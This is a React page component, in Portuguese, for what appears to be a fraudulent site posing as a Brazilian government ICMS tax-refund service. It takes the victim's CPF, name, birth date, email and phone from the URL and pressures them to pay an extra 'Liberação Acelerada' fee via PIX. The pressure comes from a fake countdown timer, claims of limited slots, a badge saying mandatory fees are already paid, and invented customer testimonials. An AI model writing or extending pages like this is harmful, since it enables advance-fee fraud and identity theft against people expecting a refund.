import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AlertTriangle, CheckCircle, Info, Loader2, Clock, CircleCheck, Zap, Timer, FileText, BanknoteIcon, Hourglass } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import ScrollToTop from "@/components/ScrollToTop";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

// Componente de contador regressivo
const ContadorRegressivo = ({ minutos = 45 }: { minutos?: number }) => {
  const [tempoRestante, setTempoRestante] = useState(minutos * 60); // Converter minutos para segundos
  
  useEffect(() => {
    const timer = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  const formatarTempo = (segundos: number) => {
    const mins = Math.floor(segundos / 60);
    const secs = segundos % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  // Calcular a porcentagem do tempo restante
  const porcentagemRestante = Math.floor((tempoRestante / (minutos * 60)) * 100);
  
  return (
    <div className="flex flex-col items-center">
      <div className="relative w-16 h-16 mb-2">
        <svg className="w-16 h-16" viewBox="0 0 100 100">
          {/* Círculo de fundo */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#EEE" 
            strokeWidth="8" 
          />
          
          {/* Círculo de progresso */}
          <circle 
            cx="50" 
            cy="50" 
            r="45" 
            fill="none" 
            stroke="#FF3B30" 
            strokeWidth="8" 
            strokeLinecap="round" 
            strokeDasharray="283" 
            strokeDashoffset={283 - (283 * porcentagemRestante / 100)} 
            transform="rotate(-90 50 50)" 
          />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <span className="text-sm font-bold text-red-600">{formatarTempo(tempoRestante)}</span>
        </div>
      </div>
      <p className="text-xs text-red-600 font-medium">Tempo restante</p>
    </div>
  );
};

export default function TaxaLAR() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [valor, setValor] = useState(0);
  const [valorTaxaLAR, setValorTaxaLAR] = useState(48.6);
  const [companhia, setCompanhia] = useState("");
  const [estado, setEstado] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [email, setEmail] = useState("");
  const [telefone, setTelefone] = useState("");
  
  // Obter parâmetros da URL
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    // Definir protocolo
    const protocoloParam = urlParams.get('protocolo');
    if (protocoloParam) {
      setProtocolo(protocoloParam);
    }
    
    // Estabelecer dados básicos
    const cpfParam = urlParams.get('cpf') || "";
    const nomeParam = urlParams.get('nome') || "";
    const valorParam = urlParams.get('valor') || "0";
    const companhiaParam = urlParams.get('companhia') || "";
    const estadoParam = urlParams.get('estado') || "";
    const nascParam = urlParams.get('nasc') || "";
    const emailParam = urlParams.get('email') || "";
    const telefoneParam = urlParams.get('telefone') || "";
    
    setCpf(cpfParam);
    setNome(nomeParam);
    setValor(parseFloat(valorParam));
    setCompanhia(companhiaParam);
    setEstado(estadoParam);
    setDataNascimento(nascParam);
    setEmail(emailParam);
    setTelefone(telefoneParam);
    
    // Se não tiver protocolo, gera um baseado no CPF
    if (!protocoloParam && cpfParam) {
      setProtocolo(`${cpfParam.substring(0, 4)}4714${cpfParam.substring(6, 9)}`);
    }
  }, []);
  
  // Função para prosseguir ao pagamento da LAR
  const prosseguirParaPagamento = () => {
    // Criar os parâmetros da URL para a página de pagamento
    const params = new URLSearchParams();
    params.append('cpf', cpf);
    params.append('nome', nome);
    params.append('valor', valor.toString());
    params.append('companhia', companhia);
    params.append('estado', estado);
    params.append('dataNascimento', dataNascimento);
    params.append('protocolo', protocolo);
    params.append('email', email);
    params.append('telefone', telefone);
    params.append('valorTaxaLAR', valorTaxaLAR.toString());
    
    // Redirecionar para a página de pagamento LAR
    setLocation(`/pagamento-lar?${params.toString()}`);
  };
  
  // Função para continuar sem pagamento da LAR (prazo normal)
  const continuarSemLAR = () => {
    // Confirmar com o usuário
    if (window.confirm("Tem certeza que deseja continuar sem a Liberação Acelerada? Seu prazo de recebimento será de 15 dias úteis ao invés de 60 minutos.")) {
      // Criar os parâmetros da URL para a página de sucesso
      const params = new URLSearchParams();
      params.append('cpf', cpf);
      params.append('nome', nome);
      params.append('valor', valor.toString());
      params.append('companhia', companhia);
      params.append('estado', estado);
      params.append('nasc', dataNascimento);
      params.append('protocolo', protocolo);
      params.append('email', email);
      params.append('telefone', telefone);
      params.append('taxasCompletas', 'true');
      params.append('larCompleto', 'false');
      
      // Redirecionar para a página de sucesso
      setLocation(`/sucesso?${params.toString()}`);
    }
  };
  
  // Formatar valores para exibição
  const valorTaxaLARFormatado = formatarMoeda(valorTaxaLAR);
  const valorRestituicaoFormatado = formatarMoeda(valor);
  const cpfFormatado = formatarCPF(cpf);
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
                <div className="bg-green-600 text-white text-xs px-2 py-1 rounded mt-1 inline-flex items-center">
                  <CheckCircle size={12} className="mr-1" />
                  Taxas obrigatórias quitadas
                </div>
              </div>
              <div className="flex items-center gap-3">
                <ContadorRegressivo minutos={45} />
                <div className="text-right bg-amber-600 rounded-md p-3">
                  <p className="font-medium text-white text-sm mb-1">Opção Prioritária:</p>
                  <p className="font-bold text-lg text-white">{valorTaxaLARFormatado}</p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mb-5">
            <Alert className="border-amber-500 bg-amber-50">
              <Zap className="h-5 w-5 text-amber-600" />
              <AlertTitle className="font-bold text-amber-800">
                3ª ETAPA (OPCIONAL) - LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
              </AlertTitle>
              <AlertDescription className="text-amber-700">
                Esta é a etapa final opcional para recebimento prioritário da sua restituição em até 60 minutos.
                Realize o pagamento da LAR para receber seu crédito de forma acelerada.
              </AlertDescription>
            </Alert>
          </div>
          
          <div className="mb-6 p-4 bg-amber-50 border-l-4 border-amber-400 rounded-md shadow-sm flex items-start">
            <Hourglass className="h-5 w-5 text-amber-600 mt-1 mr-3 flex-shrink-0" />
            <div>
              <h3 className="font-bold text-amber-800 mb-1">OFERTA POR TEMPO LIMITADO</h3>
              <p className="text-sm text-amber-700">
                A opção de Liberação Acelerada de Restituição está disponível pelos próximos <span className="font-bold text-red-600">45 minutos</span>. Após esse período, seu processo seguirá o fluxo padrão com prazo de até 15 dias úteis para depósito.
              </p>
            </div>
          </div>
          
          <div className="mb-6">
            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
              <div className="bg-white/20 p-1.5 rounded-md mr-2">
                <Zap className="h-4 w-4" />
              </div>
              LIBERAÇÃO ACELERADA DE RESTITUIÇÃO (LAR)
            </div>
            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
              <h3 className="text-xl font-bold text-center text-amber-700 mb-4">
                Receba sua restituição em até 60 minutos!
              </h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                <div>
                  <div className="bg-blue-50 p-4 rounded-lg h-full">
                    <h4 className="font-bold text-blue-800 mb-3 flex items-center">
                      <Hourglass className="mr-2 h-5 w-5 text-blue-700" />
                      SEM LIBERAÇÃO ACELERADA
                    </h4>
                    <div className="space-y-3">
                      <div className="flex items-start">
                        <Clock className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Tempo de processamento:</span><br />
                          <span className="text-red-500 font-bold">Até 15 dias úteis</span>
                        </p>
                      </div>
                      <div className="flex items-start">
                        <Info className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Prioridade:</span><br />
                          Processamento padrão por ordem de solicitação
                        </p>
                      </div>
                      <div className="flex items-start">
                        <AlertTriangle className="h-5 w-5 text-red-500 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Riscos:</span><br />
                          Sujeito a possíveis atrasos em períodos de grande volume de solicitações
                        </p>
                      </div>
                      <div className="flex items-start">
                        <BanknoteIcon className="h-5 w-5 text-gray-500 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Valor a receber:</span><br />
                          {valorRestituicaoFormatado}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="relative">
                  <div className="bg-amber-50 p-4 rounded-lg h-full border-2 border-amber-500">
                    <div className="absolute -top-3 -right-3 bg-red-600 text-white text-xs font-bold py-1 px-3 rounded-full animate-pulse">
                      RECOMENDADO
                    </div>
                    <h4 className="font-bold text-amber-800 mb-3 flex items-center">
                      <Zap className="mr-2 h-5 w-5 text-amber-600" />
                      COM LIBERAÇÃO ACELERADA
                    </h4>
                    <div className="space-y-3">
                      <div className="flex items-start">
                        <Timer className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Tempo de processamento:</span><br />
                          <span className="text-green-600 font-bold">Em até 60 minutos</span>
                        </p>
                      </div>
                      <div className="flex items-start">
                        <Zap className="h-5 w-5 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Prioridade:</span><br />
                          Processamento prioritário e imediato
                        </p>
                      </div>
                      <div className="flex items-start">
                        <CheckCircle className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Garantia:</span><br />
                          Depósito garantido com confirmação por email e SMS
                        </p>
                      </div>
                      <div className="flex items-start">
                        <BanknoteIcon className="h-5 w-5 text-green-600 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-gray-600">
                          <span className="font-semibold text-gray-700">Valor a receber:</span><br />
                          {valorRestituicaoFormatado}
                        </p>
                      </div>
                      <div className="flex items-start">
                        <Info className="h-5 w-5 text-amber-600 mt-0.5 mr-2 flex-shrink-0" />
                        <p className="text-sm text-amber-600">
                          <span className="font-semibold">Taxa LAR:</span><br />
                          {valorTaxaLARFormatado} (única e final)
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="p-4 bg-amber-50 border-l-4 border-amber-500 rounded-r-md mb-6">
                <div className="flex items-start">
                  <Zap className="h-5 w-5 text-amber-600 mt-0.5 mr-3 flex-shrink-0" />
                  <div>
                    <p className="font-bold text-amber-800 mb-1">Importante:</p>
                    <p className="text-sm text-amber-700">
                      A opção de Liberação Acelerada de Restituição tem demanda limitada, após encerrado o período de disponibilidade ou preenchidas todas as vagas, seu valor será processado apenas no sistema padrão, podendo levar até 15 dias úteis.
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="space-y-3">
                <Button 
                  onClick={prosseguirParaPagamento}
                  className="w-full font-bold py-6 text-lg bg-amber-600 hover:bg-amber-700 text-white shadow-lg shadow-amber-600/20"
                >
                  <Zap className="mr-2 h-6 w-6" />
                  Quero receber em até 60 minutos
                </Button>
                
                <Button 
                  onClick={continuarSemLAR}
                  variant="outline"
                  className="w-full py-3 text-gray-600 border-gray-300"
                >
                  Continuar sem prioridade (até 15 dias úteis)
                </Button>
              </div>
            </div>
          </div>
          
          <div className="mb-6">
            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
              <div className="bg-white/20 p-1.5 rounded-md mr-2">
                <CheckCircle className="h-4 w-4" />
              </div>
              DEPOIMENTOS DE CLIENTES
            </div>
            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="p-3 bg-blue-50 rounded-md">
                  <div className="flex items-center mb-2">
                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
                      MS
                    </div>
                    <div>
                      <p className="font-semibold text-sm">Maria S.</p>
                      <p className="text-xs text-gray-500">São Paulo, SP</p>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600">
                    "Optei pela liberação acelerada e recebi meu dinheiro em 42 minutos. Valeu muito a pena não ter que esperar semanas!"
                  </p>
                </div>
                
                <div className="p-3 bg-blue-50 rounded-md">
                  <div className="flex items-center mb-2">
                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
                      RL
                    </div>
                    <div>
                      <p className="font-semibold text-sm">Roberto L.</p>
                      <p className="text-xs text-gray-500">Curitiba, PR</p>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600">
                    "Meu irmão não pagou a liberação acelerada e ainda está esperando. Eu recebi no mesmo dia! Recomendo muito."
                  </p>
                </div>
                
                <div className="p-3 bg-blue-50 rounded-md">
                  <div className="flex items-center mb-2">
                    <div className="bg-blue-500 rounded-full w-8 h-8 flex items-center justify-center text-white font-bold mr-2">
                      JC
                    </div>
                    <div>
                      <p className="font-semibold text-sm">Julia C.</p>
                      <p className="text-xs text-gray-500">Rio de Janeiro, RJ</p>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600">
                    "Em menos de uma hora o dinheiro caiu na minha conta. Vale a pena pagar a taxa para receber rápido."
                  </p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mb-4">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Pagamento seguro via PIX</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Proteção de dados pessoais</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Depósito garantido</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}